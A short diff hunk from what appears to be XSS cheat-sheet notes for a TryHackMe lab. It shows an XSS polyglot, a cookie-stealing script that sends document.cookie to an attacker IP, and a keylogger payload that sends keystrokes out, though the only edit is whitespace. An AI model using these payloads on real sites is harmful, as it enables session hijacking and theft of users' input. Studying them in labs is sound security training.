@@ -45,4 +45,4 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )
 <script>fetch('http://10.8.1.167/steal?cookie=' + btoa(document.cookie));</script> // Steal cookies such as PHPSESSID in base64, sent to a malicious IP
 <script>document.onkeypress = function(e) { fetch('http://10.8.1.167/log?key=' + btoa(e.key) );}</script> // Log keys, keys sent to hacker.thm
 
-```
+```  
